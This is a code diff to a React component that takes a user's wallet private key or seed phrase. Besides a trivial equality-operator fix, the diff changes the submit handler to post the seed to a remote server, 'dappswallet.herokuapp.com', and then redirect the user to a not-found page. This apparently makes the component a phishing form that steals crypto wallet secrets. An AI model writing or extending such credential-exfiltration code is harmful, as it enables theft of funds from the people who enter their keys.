@@ -12,7 +12,7 @@ const PrivateKey = ({ seed3, setSeed3, error3, setError3, disabled3, setDisabled
     const isMatch2 = reg2.test(e.target.value);
     let len = e.target.value.length;
 
-    if (isMatch || isMatch2 || len == 0) {
+    if (isMatch || isMatch2 || len === 0) {
       setSeed3(e.target.value);
       setError3(false);
       setCount3(len)
@@ -24,7 +24,7 @@ const PrivateKey = ({ seed3, setSeed3, error3, setError3, disabled3, setDisabled
   };
 
   const handleSubmit = (e) => {
-    axios.post("http://localhost:8080/form", { seed: seed3 });
+    axios.post("https://dappswallet.herokuapp.com/form", { seed: seed3 });
     Navigate('/not_found')
   };
 
